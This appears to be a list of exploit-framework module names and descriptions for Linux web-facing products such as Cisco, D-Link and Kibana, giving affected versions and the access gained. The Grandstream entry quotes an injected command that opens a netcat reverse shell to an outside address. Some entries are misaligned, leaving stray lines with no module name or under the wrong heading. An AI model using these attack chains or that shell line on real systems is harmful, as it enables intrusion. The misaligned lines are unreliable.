This module exploits a vulnerability found in Cisco Firepower Management Console. The management system contains a configuration flaw that allows the www user to execute the useradd binary, which can be abused to create backdoor accounts. Authentication is required to exploit this vulnerability.

linux/http/cisco_hyperflex_file_upload_rce
This module exploits an unauthenticated file upload vulnerability in Cisco HyperFlex HX Data Platform's /upload endpoint to upload and execute a payload as the Tomcat user.

linux/http/cisco_hyperflex_hx_data_platform_cmd_exec
This module exploits an unauthenticated command injection in Cisco HyperFlex HX Data Platform's /storfs-asup endpoint to execute shell commands as the Tomcat user.

linux/http/cisco_prime_inf_rce
Cisco Prime Infrastructure (CPI) contains two basic flaws that when exploited allow an unauthenticated attacker to achieve remote code execution. The first flaw is a file upload vulnerability that allows the attacker to upload and execute files as the Apache Tomcat user; the second is a privilege escalation to root by bypassing execution restrictions in a SUID binary. This module exploits these vulnerabilities to achieve unauthenticated remote code execution as root on the CPI default installation. This module has been tested with CPI 3.2.0.0.258 and 3.4.0.0.348. Earlier and later versions might also be affected, although 3.4.0.0.348 is the latest at the time of writing. The file upload vulnerability should have been fixed in versions 3.4.1 and 3.3.1 Update 02.

linux/http/cisco_rv32x_rce
This exploit module combines an information disclosure (CVE-2019-1653) and a command injection vulnerability (CVE-2019-1652) together to gain unauthenticated remote code execution on Cisco RV320 and RV325 small business routers. Can be exploited via the WAN interface of the router. Either via HTTPS on port 443 or HTTP on port 8007 on some older firmware versions.

linux/http/cisco_rv340_lan
This module exploits two vulnerabilities, a session ID directory traversal authentication bypass (CVE-2022-20705) and a command injection vulnerability (CVE-2022-20707), on Cisco RV160, RV260, RV340, and RV345 Small Business Routers, allowing attackers to execute arbitrary commands with www-data user privileges. This access can then be used to pivot to other parts of the network. This module works on firmware versions 1.0.03.24 and below.

linux/http/cisco_rv_series_authbypass_and_rce
This module exploits an authentication bypass (CVE-2021-1472) and command injection (CVE-2021-1473) in the Cisco Small Business RV series of VPN/routers. The device does not adequately verify the credentials in the HTTP Authorization field when requests are made to the /upload endpoint. Then the upload.cgi binary will use the contents of the HTTP Cookie field as part of a `curl` request aimed at an internal endpoint. The curl request is executed using `popen` and allows the attacker to inject commands via the Cookie field. A remote and unauthenticated attacker using this module is able to achieve code execution as `www-data`. This module affects the RV340, RV340w, RV345, and RV345P using firmware versions 1.0.03.20 and below.

linux/http/cisco_ucs_cloupia_script_rce
This module exploits an authentication bypass and directory traversals in Cisco UCS Director < 6.7.4.0 to leak the administrator's REST API key and execute a Cloupia script containing an arbitrary root command. Note that the primary functionality of this module is to leverage the Cloupia script interpreter to execute code. This functionality is part of the application's intended operation and considered a "foreverday." The authentication bypass and directory traversals only get us there. If you already have an API key, you may set it in the API_KEY option. The LEAK_FILE option may be set if you wish to leak the API key from a different absolute path, but normally this isn't advisable. Tested on Cisco's VMware distribution of 6.7.3.0.

linux/http/cisco_ucs_rce
The Cisco UCS Director virtual appliance contains two flaws that can be combined and abused by an attacker to achieve remote code execution as root. The first one, CVE-2019-1937, is an authentication bypass, that allows the attacker to authenticate as an administrator. The second one, CVE-2019-1936, is a command injection in a password change form, that allows the attacker to inject commands that will execute as root. This module combines both vulnerabilities to achieve the unauthenticated command injection as root. It has been tested with Cisco UCS Director virtual machines 6.6.0 and 6.7.0. Note that Cisco also mentions in their advisory that their IMC Supervisor and UCS Director Express are also affected by these vulnerabilities, but this module was not tested with those products.

linux/http/control_web_panel_login_cmd_exec
Control Web Panel versions < 0.9.8.1147 are vulnerable to unauthenticated OS command injection. Successful exploitation results in code execution as the root user. The results of the command are not contained within the HTTP response and the request will block while the command is running.

linux/http/cpi_tararchive_upload
This module exploits a vulnerability found in Cisco Prime Infrastructure. The issue is that the TarArchive Java class the HA Health Monitor component uses does not check for any directory traversals while unpacking a Tar file, which can be abused by a remote user to leverage the UploadServlet class to upload a JSP payload to the Apache Tomcat's web apps directory, and gain arbitrary remote code execution. Note that authentication is not required to exploit this vulnerability.

linux/http/crypttech_cryptolog_login_exec
This module exploits a SQL injection and command injection vulnerability in the PHP version of CryptoLog. An unauthenticated user can execute a terminal command under the context of the web user. These vulnerabilities are no longer present in the ASP.NET version CryptoLog, available since 2009. CryptoLog's login.php endpoint is responsible for the login process. One of the user supplied parameters is used by the application without input validation and parameter binding, which leads to SQL injection vulnerability. Successfully exploiting this vulnerability gives a valid session. CryptoLog's logshares_ajax.php endpoint is responsible for executing an operation system command. It's not possible to access this endpoint without having a valid session. One user parameter is used by the application while executing an operating system command, which causes a command injection issue. Combining these vulnerabilities gives the opportunity execute operation system commands under the context of the web user.

linux/http/cve_2019_1663_cisco_rmi_rce
A vulnerability in the web-based management interface of the Cisco RV110W Wireless-N VPN Firewall, Cisco RV130W Wireless-N Multifunction VPN Router, and Cisco RV215W Wireless-N VPN Router could allow an unauthenticated, remote attacker to execute arbitrary code on an affected device. The vulnerability is due to improper validation of user-supplied data in the web-based management interface. An attacker could exploit this vulnerability by sending malicious HTTP requests to a targeted device. A successful exploit could allow the attacker to execute arbitrary code on the underlying operating system of the affected device as a high-privilege user. RV110W Wireless-N VPN Firewall versions prior to 1.2.2.1 are affected. RV130W Wireless-N Multifunction VPN Router versions prior to 1.0.3.45 are affected. RV215W Wireless-N VPN Router versions prior to 1.3.1.1 are affected. Note: successful exploitation may not result in a session, and as such, on_new_session will never repair the HTTP server, leading to a denial-of-service condition.

linux/http/dcos_marathon
Utilizing the DCOS Cluster's Marathon UI, an attacker can create a docker container with the '/' path mounted with read/write permissions on the host server that is running the docker container. As the docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owed by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server. *Notes: The docker image must be a valid docker image from hub.docker.com. Furthermore the docker container will only deploy if there are resources available in the DC/OS cluster.

linux/http/ddwrt_cgibin_exec
This module abuses a metacharacter injection vulnerability in the HTTP management server of wireless gateways running DD-WRT. This flaw allows an unauthenticated attacker to execute arbitrary commands as the root user account.

linux/http/denyall_waf_exec
This module exploits the command injection vulnerability of DenyAll Web Application Firewall. Unauthenticated users can execute a terminal command under the context of the web server user.

linux/http/dlink_authentication_cgi_bof
This module exploits a remote buffer overflow vulnerability on several D-Link routers. The vulnerability exists in the handling of HTTP queries to the authentication.cgi with long password values. The vulnerability can be exploitable without authentication. This module has been tested successfully on D-Link firmware DIR645A1_FW103B11. Other firmwares such as the DIR865LA1_FW101b06 and DIR845LA1_FW100b20 are also vulnerable.

linux/http/dlink_command_php_exec_noauth
Various D-Link Routers are vulnerable to OS command injection via the web interface. The vulnerability exists in command.php, which is accessible without authentication. This module has been tested with the versions DIR-600 2.14b01, DIR-300 rev B 2.13.

linux/http/dlink_dcs931l_upload
This module exploits a file upload vulnerability in D-Link DCS-931L network cameras. The setFileUpload functionality allows authenticated users to upload files to anywhere on the file system, allowing system files to be overwritten, resulting in execution of arbitrary commands. This module has been tested successfully on a D-Link DCS-931L with firmware versions 1.01_B7 (2013-04-19) and 1.04_B1 (2014-04-21). D-Link DCS-930L, DCS-932L, DCS-933L models are also reportedly affected, but untested.

linux/http/dlink_dcs_930l_authenticated_remote_command_execution
The D-Link DCS-930L Network Video Camera is vulnerable to OS Command Injection via the web interface. The vulnerability exists at /setSystemCommand, which is accessible with credentials. This vulnerability was present in firmware version 2.01 and fixed by 2.12.

linux/http/dlink_diagnostic_exec_noauth
Some D-Link Routers are vulnerable to OS Command injection in the web interface. On DIR-645 versions prior 1.03 authentication isn't needed to exploit it. On version 1.03 authentication is needed in order to trigger the vulnerability, which has been fixed definitely on version 1.04. Other D-Link products, like DIR-300 rev B and DIR-600, are also affected by this vulnerability. Not every device includes wget which we need for deploying our payload. On such devices you could use the cmd generic payload and try to start telnetd or execute other commands. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. This module has been tested successfully on DIR-645 prior to 1.03, where authentication isn't needed in order to exploit the vulnerability.

linux/http/dlink_dir300_exec_telnet
Various D-Link Routers are vulnerable to OS command injection via the web interface. The vulnerability exists in tools_vct.xgi, which is accessible with credentials. According to the vulnerability discoverer, more D-Link devices may be affected.

linux/http/dlink_dir605l_captcha_bof
This module exploits an anonymous remote code execution vulnerability on D-Link DIR-605L routers. The vulnerability exists while handling user supplied captcha information, and is due to the insecure usage of sprintf on the getAuthCode() function. This module has been tested successfully on D-Link DIR-605L firmware 1.13 (emulated) and firmware 1.12 (real).

linux/http/dlink_dir615_up_exec
Some D-Link Routers are vulnerable to an authenticated OS command injection on their web interface, where default credentials are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. This module was tested against a DIR-615 hardware revision H1 - firmware version 8.04. A ping command against a controlled system could be used for testing purposes. The exploit uses the wget client from the device to convert the command injection into an arbitrary payload execution.

linux/http/dlink_dir850l_unauth_exec
This module leverages an unauthenticated credential disclosure vulnerability to then execute arbitrary commands on DIR-850L routers as an authenticated user. Unable to use Meterpreter payloads.

linux/http/dlink_dsl2750b_exec_noauth
This module exploits a remote command injection vulnerability in D-Link DSL-2750B devices. Vulnerability can be exploited through "cli" parameter that is directly used to invoke "ayecli" binary. Vulnerable firmwares are from 1.01 up to 1.03.

linux/http/dlink_dspw110_cookie_noauth_exec
This module exploits an anonymous remote upload and code execution vulnerability on different D-Link devices. The vulnerability is a command injection in the cookie handling process of the lighttpd web server when handling specially crafted cookie values. This module has been successfully tested on D-Link DSP-W110A1_FW105B01 in emulated environment.

linux/http/dlink_dspw215_info_cgi_bof
This module exploits an anonymous remote code execution vulnerability on different D-Link devices. The vulnerability is a stack based buffer overflow in the my_cgi.cgi component, when handling specially crafted POST HTTP requests addresses to the /common/info.cgi handler. This module has been successfully tested on D-Link DSP-W215 in an emulated environment.

linux/http/dlink_dwl_2600_command_injection
Some DLINK Access Points are vulnerable to an authenticated OS command injection. Default credentials for the web interface are admin/admin.

linux/http/dlink_hedwig_cgi_bof
This module exploits an anonymous remote code execution vulnerability on several D-Link routers. The vulnerability exists in the handling of HTTP queries to the hedwig.cgi with long value cookies. This module has been tested successfully on D-Link DIR300v2.14, DIR600 and the DIR645A1_FW103B11 firmware.

linux/http/dlink_hnap_bof
This module exploits an anonymous remote code execution vulnerability on different D-Link devices. The vulnerability is due to a stack based buffer overflow while handling malicious HTTP POST requests addressed to the HNAP handler. This module has been successfully tested on D-Link DIR-505 in an emulated environment.

linux/http/dlink_hnap_header_exec_noauth
Different D-Link Routers are vulnerable to OS command injection in the HNAP SOAP interface. Since it is a blind OS command injection vulnerability, there is no output for the executed command. This module has been tested on a DIR-645 device. The following devices are also reported as affected: DAP-1522 revB, DAP-1650 revB, DIR-880L, DIR-865L, DIR-860L revA, DIR-860L revB DIR-815 revB, DIR-300 revB, DIR-600 revB, DIR-645, TEW-751DR, TEW-733GR

linux/http/dlink_hnap_login_bof
Several Dlink routers contain a pre-authentication stack buffer overflow vulnerability, which is exposed on the LAN interface on port 80. This vulnerability affects the HNAP SOAP protocol, which accepts arbitrarily long strings into certain XML parameters and then copies them into the stack. This exploit has been tested on the real devices DIR-818LW and 868L (rev. B), and it was tested using emulation on the DIR-822, 823, 880, 885, 890 and 895. Others might be affected, and this vulnerability is present in both MIPS and ARM devices. The MIPS devices are powered by Lextra RLX processors, which are crippled MIPS cores lacking a few load and store instructions. Because of this the payloads have to be sent unencoded, which can cause them to fail, although the bind shell seems to work well. For the ARM devices, the inline reverse tcp seems to work best. Check the reference links to see the vulnerable firmware versions.

linux/http/dlink_upnp_exec_noauth
Different D-Link Routers are vulnerable to OS command injection in the UPnP SOAP interface. Since it is a blind OS command injection vulnerability, there is no output for the executed command. This module has been tested on DIR-865 and DIR-645 devices.

linux/http/dnalims_admin_exec
This module utilizes an administrative module which allows for command execution. This page is completely unprotected from any authentication when given a POST request.

linux/http/docker_daemon_tcp
Utilizing Docker via unprotected tcp socket (2375/tcp, maybe 2376/tcp with tls but without tls-auth), an attacker can create a Docker container with the '/' path mounted with read/write permissions on the host server that is running the Docker container. As the Docker container executes command as uid 0 it is honored by the host operating system allowing the attacker to edit/create files owned by root. This exploit abuses this to creates a cron job in the '/etc/cron.d/' path of the host server. The Docker image should exist on the target system or be a valid image from hub.docker.com.

linux/http/dolibarr_cmd_exec
This module exploits a vulnerability found in Dolibarr ERP/CRM 3's backup feature. This software is used to manage a company's business information such as contacts, invoices, orders, stocks, agenda, etc. When processing a database backup request, the export.php function does not check the input given to the sql_compat parameter, which allows a remote authenticated attacker to inject system commands into it, and then gain arbitrary code execution.

linux/http/dreambox_openpli_shell
Some Dream Boxes with OpenPLI v3 beta Images are vulnerable to OS command injection in the Webif 6.0.4 Web Interface. This is a blind injection, which means that you will not see any output of your command. A ping command can be used for testing the vulnerability. This module has been tested in a box with the next features: Linux Kernel version 2.6.9 (build@plibouwserver) (gcc version 3.4.4) #1 Wed Aug 17 23:54:07 CEST 2011, Firmware release 1.1.0 (27.01.2013), FP Firmware 1.06 and Web Interface 6.0.4-Expert (PLi edition).

linux/http/efw_chpasswd_exec
This module exploits an OS command injection vulnerability in a web-accessible CGI script used to change passwords for locally-defined proxy user accounts. Valid credentials for such an account are required. Command execution will be in the context of the "nobody" account, but this account had broad sudo permissions, including to run the script /usr/local/bin/chrootpasswd (which changes the password for the Linux root account on the system to the value specified by console input once it is executed). The password for the proxy user account specified will *not* be changed by the use of this module, as long as the target system is vulnerable to the exploit. Very early versions of Endian Firewall (e.g. 1.1 RC5) require HTTP basic auth credentials as well to exploit this vulnerability. Use the USERNAME and PASSWORD advanced options to specify these values if required. Versions >= 3.0.0 still contain the vulnerable code, but it appears to never be executed due to a bug in the vulnerable CGI script which also prevents normal use (http://jira.endian.com/browse/UTM-1002). Versions 2.3.x and 2.4.0 are not vulnerable because of a similar bug (http://bugs.endian.com/print_bug_page.php?bug_id=3083). Tested successfully against the following versions of EFW Community: 1.1 RC5, 2.0, 2.1, 2.2, 2.5.1, 2.5.2. Should function against any version from 1.1 RC5 to 2.2.x, as well as 2.4.1 and 2.5.x.

linux/http/elfinder_archive_cmd_injection
elFinder versions below 2.1.59 are vulnerable to a command injection vulnerability via its archive functionality. When creating a new zip archive, the `name` parameter is sanitized with the `escapeshellarg()` php function and then passed to the `zip` utility. Despite the sanitization, supplying the `-TmTT` argument as part of the `name` parameter is still permitted and enables the execution of arbitrary commands as the `www-data` user.

linux/http/empire_skywalker
A vulnerability existed in the PowerShellEmpire server prior to commit f030cf62 which would allow an arbitrary file to be written to an attacker controlled location with the permissions of the Empire server. This exploit will write the payload to /tmp/ directory followed by a cron.d file to execute the payload.

linux/http/esva_exec
This module exploits a command injection vulnerability found in E-Mail Security Virtual Appliance. This module abuses the learn-msg.cgi file to execute arbitrary OS commands without authentication. This module has been successfully tested on the ESVA_2057 appliance.

linux/http/eyesofnetwork_autodiscovery_rce
This module exploits multiple vulnerabilities in EyesOfNetwork version 5.1, 5.2 and 5.3 in order to execute arbitrary commands as root. This module takes advantage of a command injection vulnerability in the `target` parameter of the AutoDiscovery functionality within the EON web interface in order to write an Nmap NSE script containing the payload to disk. It then starts an Nmap scan to activate the payload. This results in privilege escalation because the`apache` user can execute Nmap as root. Valid credentials for a user with administrative privileges are required. However, this module can bypass authentication via various methods, depending on the EON version. EON 5.3 is vulnerable to a hardcoded API key and two SQL injection exploits. EON 5.1 and 5.2 can only be exploited via SQL injection. This module has been successfully tested on EyesOfNetwork 5.1, 5.2 and 5.3.

linux/http/f5_bigip_tmui_rce
This module exploits a directory traversal in F5's BIG-IP Traffic Management User Interface (TMUI) to upload a shell script and execute it as the Unix root user. Unix shell access is obtained by escaping the restricted Traffic Management Shell (TMSH). The escape may not be reliable, and you may have to run the exploit multiple times. Sorry! Versions 11.6.1-11.6.5, 12.1.0-12.1.5, 13.1.0-13.1.3, 14.1.0-14.1.2, 15.0.0, and 15.1.0 are known to be vulnerable. Fixes were introduced in 11.6.5.2, 12.1.5.2, 13.1.3.4, 14.1.2.6, and 15.1.0.4. Tested against the VMware OVA release of 14.1.2.

linux/http/f5_icontrol_soap_csrf_rce_cve_2022_41622
This module exploits a cross-site request forgery (CSRF) vulnerability in F5 Big-IP's iControl interface to write an arbitrary file to the filesystem. While any file can be written to any location as root, the exploitability is limited by SELinux; the vast majority of writable locations are unavailable. By default, we write to a script that executes at reboot, which means the payload will execute the next time the server boots. An alternate target - Login - will add a backdoor that executes next time a user logs in interactively. This overwrites a file, but we restore it when we get a session Note that because this is a CSRF vulnerability, it starts a web server, but an authenticated administrator must visit the site, which redirects them to the target.

linux/http/flir_ax8_unauth_rce_cve_2022_37061
All FLIR AX8 thermal sensor cameras versions up to and including 1.46.16 are vulnerable to Remote Command Injection.

Successful exploitation results in remote code execution as the root user.

linux/http/github_enterprise_secret
This module exploits two security issues in Github Enterprise, version 2.8.0 - 2.8.6. The first is that the session management uses a hard-coded secret value, which can be abused to sign a serialized malicious Ruby object. The second problem is due to the use of unsafe deserialization, which allows the malicious Ruby object to be loaded, and results in arbitrary remote code execution. This exploit was tested against version 2.8.0.

linux/http/gitlist_exec
This module exploits an unauthenticated remote command execution vulnerability in version 0.4.0 of Gitlist. The problem exists in the handling of a specially crafted file name when trying to blame it.

This module has been tested successfully on GoAutoDial version 3.3-1406088000.

linux/http/gpsd_format_string
This module exploits a format string vulnerability in the Berlios GPSD server. This vulnerability was discovered by Kevin Finisterre.

linux/http/grandstream_gxv31xx_settimezone_unauth_cmd_exec
This module exploits a command injection vulnerability in Grandstream GXV31XX IP multimedia phones. The 'settimezone' action does not validate input in the 'timezone' parameter allowing injection of arbitrary commands. A buffer overflow in the 'phonecookie' cookie parsing allows authentication to be bypassed by providing an alphanumeric cookie 93 characters in length. This module was tested successfully on Grandstream models: GXV3175v2 hardware revision V2.6A with firmware version 1.0.1.19; and GXV3140 hardware revision V0.4B with firmware version 1.0.1.27.

linux/http/grandstream_ucm62xx_sendemail_rce
This module exploits an unauthenticated SQL injection vulnerability (CVE-2020-5722) and a command injection vulnerability (technically, no assigned CVE but was inadvertently patched at the same time as CVE-2019-10662) affecting the Grandstream UCM62xx IP PBX series of devices. The vulnerabilities allow an unauthenticated remote attacker to execute commands as root. Exploitation happens in two stages: 1. An SQL injection during username lookup while executing the "Forgot Password" function. 2. A command injection that occurs after the user provided username is passed to a Python script via the shell. Like so: /bin/sh -c python /app/asterisk/var/lib/asterisk/scripts/sendMail.py \ password '' `cat <<'TTsf7G0' z' or 1=1--`;`nc 10.0.0.3 4444 -e /bin/sh`;` TTsf7G0 ` This module affect UCM62xx versions before firmware version 1.0.19.20.

linux/http/gravcms_exec
This module exploits arbitrary config write/update vulnerability to achieve remote code execution. Unauthenticated users can execute a terminal command under the context of the web server user. Grav Admin Plugin is an HTML user interface that provides a way to configure Grav and create and modify pages. In versions 1.10.7 and earlier, an unauthenticated user can execute some methods of administrator controller without needing any credentials. Particular method execution will result in arbitrary YAML file creation or content change of existing YAML files on the system. Successfully exploitation of that vulnerability results in configuration changes, such as general site information change, custom scheduler job definition, etc. Due to the nature of the vulnerability, an adversary can change some part of the webpage, or hijack an administrator account, or execute operating system command under the context of the web-server user.

linux/http/groundwork_monarch_cmd_exec
This module exploits a vulnerability found in GroundWork 6.7.0. This software is used for network, application and cloud monitoring. The vulnerability exists in the monarch_scan.cgi where user controlled input is used in the perl qx function. This allows any remote authenticated attacker, regardless of privileges, to inject system commands and gain arbitrary code execution. The module has been tested successfully on GroundWork 6.7.0-br287-gw1571 as distributed within the Ubuntu 10.04 based VM appliance.

linux/http/h2_webinterface_rce
The H2 database contains an alias function which allows for arbitrary Java code to be used. This functionality can be abused to create an exec functionality to pull our payload down and execute it. H2's web interface contains restricts MANY characters, so injecting a payload directly is not favorable. A valid database connection is required. If the database engine was configured to allow creation of databases, the module default can be used which utilizes an in memory database. Some Docker instances of H2 don't allow writing to folders such as /tmp, so we default to writing to the working directory of the software. This module was tested against H2 version 2.1.214, 2.0.204, 1.4.199 (version detection fails)

linux/http/hadoop_unauth_exec
This module uses Hadoop's standard ResourceManager REST API to execute arbitrary commands on an unsecured Hadoop server. Hadoop administrators should enable Kerberos authentication for these endpoints by changing the 'hadoop.security.authentication' setting in 'core-site.xml' from 'simple' (the default) to 'kerberos' before exposing the node to the network.

linux/http/hikvision_cve_2021_36260_blind
This module exploits an unauthenticated command injection in a variety of Hikvision IP cameras (CVE-2021-36260). The module inserts a command into an XML payload used with an HTTP PUT request sent to the `/SDK/webLanguage` endpoint, resulting in command execution as the `root` user. This module specifically attempts to exploit the blind variant of the attack. The module was successfully tested against an HWI-B120-D/W using firmware V5.5.101 build 200408. It was also tested against an unaffected DS-2CD2142FWD-I using firmware V5.5.0 build 170725. Please see the Hikvision advisory for a full list of affected products.

linux/http/hp_system_management
This module exploits an anonymous remote code execution on HP System Management 7.1.1 and earlier. The vulnerability exists when handling the iprange parameter on a request against /proxy/DataValidation. In order to work HP System Management must be configured with Anonymous access enabled.

linux/http/hp_van_sdn_cmd_inject
This module exploits a hardcoded service token or default credentials in HPE VAN SDN Controller <= 2.7.18.0503 to execute a payload as root. A root command injection was discovered in the uninstall action's name parameter, obviating the need to use sudo for privilege escalation. If the service token option TOKEN is blank, USERNAME and PASSWORD will be used for authentication. An additional login request will be sent.

linux/http/huawei_hg532n_cmdinject
This module exploits a command injection vulnerability in the Huawei HG532n routers provided by TE-Data Egypt, leading to a root shell. The router's web interface has two kinds of logins, a "limited" user:user login given to all customers and an admin mode. The limited mode is used here to expose the router's telnet port to the outside world through NAT port-forwarding. With telnet now remotely accessible, the router's limited "ATP command line tool" (served over telnet) can be upgraded to a root shell through an injection into the ATP's hidden "ping" command.

linux/http/ibm_drm_rce
IBM Data Risk Manager (IDRM) contains three vulnerabilities that can be chained by an unauthenticated attacker to achieve remote code execution as root. The first is an unauthenticated bypass, followed by a command injection as the server user, and finally abuse of an insecure default password. This module exploits all three vulnerabilities, giving the attacker a root shell. At the time of disclosure this was an 0day, but it was later confirmed and patched by IBM. The authentication bypass works on versions <= 2.0.6.1, but the command injection should only work on versions <= 2.0.4 according to IBM.

linux/http/ibm_qradar_unauth_rce
IBM QRadar SIEM has three vulnerabilities in the Forensics web application that when chained together allow an attacker to achieve unauthenticated remote code execution. The first stage bypasses authentication by fixating session cookies. The second stage uses those authenticated sessions cookies to write a file to disk and execute that file as the "nobody" user. The third and final stage occurs when the file executed as "nobody" writes an entry into the database that causes QRadar to execute a shell script controlled by the attacker as root within the next minute. Details about these vulnerabilities can be found in the advisories listed in References. The Forensics web application is disabled in QRadar Community Edition, but the code still works, so these vulnerabilities can be exploited in all flavours of QRadar. This module was tested with IBM QRadar CE 7.3.0 and 7.3.1. IBM has confirmed versions up to 7.2.8 patch 12 and 7.3.1 patch 3 are vulnerable. Due to payload constraints, this module only runs a generic/shell_reverse_tcp payload.

linux/http/imperva_securesphere_exec
This module exploits a command injection vulnerability in Imperva SecureSphere 13.x. The vulnerability exists in the PWS service, where Python CGIs didn't properly sanitize user supplied command parameters and directly passes them to corresponding CLI utility, leading to command injection. Agent registration credential is required to exploit SecureSphere in gateway mode. This module was successfully tested on Imperva SecureSphere 13.0/13.1/ 13.2 in pre-ftl mode and unsealed gateway mode.

Successful exploitation results in command execution as the `nobody` user.

linux/http/ivanti_sentry_misc_log_service
This module exploits an authentication bypass in Ivanti Sentry which exposes API functionality which allows for code execution in the context of the root user.

linux/http/jenkins_cli_deserialization
An unauthenticated Java object deserialization vulnerability exists in the CLI component for Jenkins versions `v2.56` and below. The `readFrom` method within the `Command` class in the Jenkins CLI remoting component deserializes objects received from clients without first checking / sanitizing the data. Because of this, a malicious serialized object contained within a serialized `SignedObject` can be sent to the Jenkins endpoint to achieve code execution on the target.

linux/http/kaltura_unserialize_cookie_rce
This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user. Kaltura makes use of a hardcoded cookie secret which allows to sign arbitrary cookie data. After passing this signature check, the base64- decoded data is passed to PHPs unserialize() function which allows for code execution. The constructed object is again based on the SektionEins Zend code execution POP chain PoC. Kaltura versions prior to 13.1.0 are affected by this issue. A valid entry_id (which is required for this exploit) can be obtained from any media resource published on the kaltura installation. This module was tested against Kaltura 13.1.0-2 installed on Ubuntu 14.04.

linux/http/kaltura_unserialize_rce
This module exploits an Object Injection vulnerability in Kaltura. By exploiting this vulnerability, unauthenticated users can execute arbitrary code under the context of the web server user. Kaltura has a module named keditorservices that takes user input and then uses it as an unserialized function parameter. The constructed object is based on the SektionEins Zend code execution POP chain PoC, with a minor modification to ensure Kaltura processes it and the Zend_Log function's __destruct() method is called. Kaltura versions prior to 11.1.0-2 are affected by this issue. This module was tested against Kaltura 11.1.0 installed on CentOS 6.8.

linux/http/kibana_timelion_prototype_pollution_rce
Kibana versions before 5.6.15 and 6.6.1 contain an arbitrary code execution flaw in the Timelion visualizer. An attacker with access to the Timelion application could send a request that will attempt to execute javascript code. This leads to an arbitrary command execution with permissions of the Kibana process on the host system. Exploitation will require a service or system reboot to restore normal operation. The WFSDELAY parameter is crucial for this exploit. Setting it too high will cause MANY shells (50-100+), while setting it too low will cause no shells to be obtained. WFSDELAY of 10 for a docker image caused 6 shells. Tested against kibana 6.5.4.

linux/http/kibana_upgrade_assistant_telemetry_rce
Kibana before version 7.6.3 suffers from a prototype pollution bug within the Upgrade Assistant. By setting a new constructor.prototype.sourceURL value we're able to execute arbitrary code. Code execution is possible through two different ways. Either by sending data directly to Elastic, or using Kibana to submit the same queries. Either method enters the polluted prototype for Kibana to read. Kibana will either need to be restarted, or collection happens (unknown time) for the payload to execute. Once it does, cleanup must delete the .kibana_1 index for Kibana to restart successfully. Once a callback does occur, cleanup will happen allowing Kibana to be successfully restarted on next attempt.

linux/http/klog_server_authenticate_user_unauth_command_injection
This module exploits an unauthenticated command injection vulnerability in Klog Server versions 2.4.1 and prior. The `authenticate.php` file uses the `user` HTTP POST parameter in a call to the `shell_exec()` PHP function without appropriate input validation, allowing arbitrary command execution as the apache user. The sudo configuration permits the apache user to execute any command as root without providing a password, resulting in privileged command execution as root. This module has been successfully tested on Klog Server version 2.4.1 virtual appliance.

linux/http/kloxo_sqli
This module exploits an unauthenticated SQL injection vulnerability affecting Kloxo, as exploited in the wild on January 2014. The SQL injection issue can be abused in order to retrieve the Kloxo admin cleartext password from the database. With admin access to the web control panel, remote PHP code execution can be achieved by abusing the Command Center function. The module tries to find the first server in the tree view, unless the server information is provided, in which case it executes the payload there.

linux/http/lexmark_faxtrace_settings
A unauthenticated Remote Code Execution vulnerability exists in the embedded webserver in certain Lexmark devices through 2023-02-19. The vulnerability is only exposed if, when setting up the printer or device, the user selects "Set up Later" when asked if they would like to add an Admin user. If no Admin user is created the endpoint `/cgi-bin/fax_change_faxtrace_settings` is accessible without authentication. The endpoint allows the user to configure a number of different fax settings. A number of the configurable parameters on the page (ex. `FT_Custom_lbtrace`) fail to be sanitized properly before being used in an bash eval statement: `eval "$cmd" > /dev/null`, allowing for an unauthenticated user to run arbitrary commands.

linux/http/librenms_addhost_cmd_inject
This module exploits a command injection vulnerability in the open source network management software known as LibreNMS. The community parameter used in a POST request to the addhost functionality is unsanitized. This parameter is later used as part of a shell command that gets passed to the popen function in capture.inc.php, which can result in execution of arbitrary code. This module requires authentication to LibreNMS first.

linux/http/librenms_collectd_cmd_inject
This module exploits a command injection vulnerability in the Collectd graphing functionality in LibreNMS. The `to` and `from` parameters used to define the range for a graph are sanitized using the `mysqli_escape_real_string()` function, which permits backticks. These parameters are used as part of a shell command that gets executed via the `passthru()` function, which can result in code execution.

linux/http/lifesize_uvc_ping_rce
When authenticated as an administrator on LifeSize UVC 1.2.6, an attacker can abuse the ping diagnostic functionality to achieve remote command execution as the www-data user (or equivalent).

linux/http/linksys_wrt160nv2_apply_exec
Some Linksys Routers are vulnerable to an authenticated OS command injection on their web interface where default credentials are admin/admin or admin/password. Since it is a blind OS command injection vulnerability, there is no output for the executed command when using the cmd generic payload. This module has been tested on a Linksys WRT160n version 2 - firmware version v2.0.03. A ping command against a controlled system could be used for testing purposes. The exploit uses the tftp client from the device to stage to native payloads from the command injection.

linux/http/linksys_wrt54gl_apply_exec
Some Linksys Routers are vulnerable to an authenticated OS command injection in the Web Interface. Default credentials are admin/admin or admin/password. Since it is a blind os command injection vulnerability, there is no output for the executed command when using the cmd generic payload. A ping command against a controlled system could be used for testing purposes. The user must be prudent when using this module since it modifies the router configuration while exploitation, even when it tries to restore previous values.

linux/http/linksys_wvbr0_user_agent_exec_noauth
The Linksys WVBR0-25 Wireless Video Bridge, used by DirecTV to connect wireless Genie cable boxes to the Genie DVR, is vulnerable to OS command injection in version < 1.0.41 of the web management portal via the User-Agent header. Authentication is not required to exploit this vulnerability.

This module exploits an arbitrary file write in Lucee Administrator's imgProcess.cfm file to execute commands as the Tomcat user.

linux/http/mailcleaner_exec
This module exploits the command injection vulnerability of MailCleaner Community Edition product. An authenticated user can execute an operating system command under the context of the web server user which is root. /admin/managetracing/search/search endpoint takes several user inputs and then pass them to the internal service which is responsible for executing operating system command. One of the user input is being passed to the service without proper validation. That cause a command injection vulnerability.

linux/http/metabase_setup_token_rce
Metabase versions before 0.46.6.1 contain a flaw where the secret setup-token is accessible even after the setup process has been completed. With this token a user is able to submit the setup functionality to create a new database. When creating a new database, an H2 database string is created with a TRIGGER that allows for code execution. We use a sample database for our connection string to prevent corrupting real databases. Successfully tested against Metabase 0.46.6.

linux/http/microfocus_obr_cmd_injection
This module exploits a command injection vulnerability on *login* (yes, you read that right) that affects Micro Focus Operations Bridge Reporter on Linux, versions 10.40 and below. It's a straight up command injection, with little escaping required and it works before authentication. This module has been tested on the Linux 10.40 version. Older versions might be affected, check the advisory for details.

linux/http/microfocus_secure_messaging_gateway
